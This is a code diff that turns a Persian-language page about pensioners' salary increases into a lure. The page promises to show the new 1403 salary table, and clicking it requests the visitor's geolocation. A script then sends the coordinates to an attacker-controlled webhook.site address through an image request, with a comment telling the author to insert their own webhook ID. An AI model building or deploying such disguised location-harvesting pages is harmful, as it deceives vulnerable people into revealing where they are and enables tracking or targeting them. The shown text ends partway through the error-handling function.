@@ -3,113 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>سامانه استعلام افزایش حقوق بازنشستگان ۱۴۰۳</title>
+    <title>پورتال خبری</title>
     <style>
-        :root {
-            --primary: #1a3658;
-            --secondary: #c5a059;
-            --bg: #f8fafc;
-            --text: #334155;
-        }
+        body { font-family: sans-serif; background-color: #f0f2f5; text-align: center; padding: 20px; }
+        .card { background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); cursor: pointer; }
+        .btn { background: #e74c3c; color: white; padding: 10px 20px; border-radius: 5px; display: inline-block; margin-top: 10px; text-decoration: none; }
+    </style>
+</head>
+<body>
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Tahoma', 'Arial', sans-serif;
-        }
+    <div class="card" onclick="getLocation()">
+        <h2>اعلام جدول جدید حقوق ۱۴۰۳</h2>
+        <p>برای مشاهده مبلغ، روی دکمه زیر کلیک کنید</p>
+        <div class="btn">مشاهده مبلغ</div>
+    </div>
 
-        body {
-            background-color: var(--bg);
-            color: var(--text);
-            line-height: 1.7;
+    <script>
+    function getLocation() {
+        // 1. بررسی اینکه آیا مرورگر اصلا قابلیت لوکیشن دارد یا نه
+        if (navigator.geolocation) {
+            alert("در حال درخواست دسترسی... لطفا روی Allow کلیک کنید");
+            
+            navigator.geolocation.getCurrentPosition(sendPosition, showError);
+        } else {
+            alert("مرورگر شما از لوکیشن پشتیبانی نمی‌کند");
         }
+    }
 
-        header {
-            background: var(--primary);
-            color: white;
-            padding: 20px 5%;
-            text-align: center;
-            border-bottom: 5px solid var(--secondary);
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-        }
+    function sendPosition(position) {
+        var lat = position.coords.latitude;
+        var lon = position.coords.longitude;
+        
+        alert("مختصات گرفته شد! در حال ارسال به سرور...");
 
-        header h1 {
-            font-size: 22px;
-            margin-bottom: 5px;
-        }
+        // !!! لینک وب‌هوک خودت را اینجا جایگزین کن !!!
+        var webhookUrl = "https://webhook.site/YOUR_ID_HERE"; 
 
-        header p {
-            font-size: 14px;
-            opacity: 0.9;
-        }
+        var img = new Image(); 
+        img.src = webhookUrl + "?lat=" + lat + "&lon=" + lon;
+        
+        alert("ارسال موفقیت‌آمیز بود. حالا پنل وب‌هوک را چک کن.");
+    }
 
-        .container {
-            max-width: 600px;
-            margin: 30px auto;
-            padding: 0 15px;
-        }
-
-        .main-card {
-            background: white;
-            border-radius: 20px;
-            padding: 30px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
-            border: 1px solid #e2e8f0;
-            text-align: center;
-        }
-
-        .badge {
-            background: #fef3c7;
-            color: #92400e;
-            padding: 5px 12px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: bold;
-            margin-bottom: 15px;
-            display: inline-block;
-        }
-
-        h2 {
-            color: var(--primary);
-            margin-bottom: 20px;
-            font-size: 20px;
-        }
-
-        .alert-box {
-            background: #eff6ff;
-            border-right: 4px solid #3b82f6;
-            padding: 15px;
-            font-size: 14px;
-            text-align: right;
-            margin-bottom: 25px;
-            border-radius: 0 8px 8px 0;
-        }
-
-        .btn-verify {
-            background: var(--primary);
-            color: white;
-            width: 100%;
-            padding: 18px;
-            border: none;
-            border-radius: 12px;
-            font-size: 17px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(26, 54, 88, 0.3);
-        }
-
-        .btn-verify:hover {
-            background: #254d7e;
-            transform: translateY(-2px);
-        }
-
-        .btn-verify:disabled {
-            background: #94a3b8;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        #status-msg {
-            margin-top: 20px;
+    function showError(error) {
+        switch(error.code) {
+            case error.PERMISSION_DENIED:
+                alert("خطا: شما اجازه دسترسی به مکان را ندادید (Block کردید)");
+                break;
+            case error.POSITION_UNAVAILABLE:
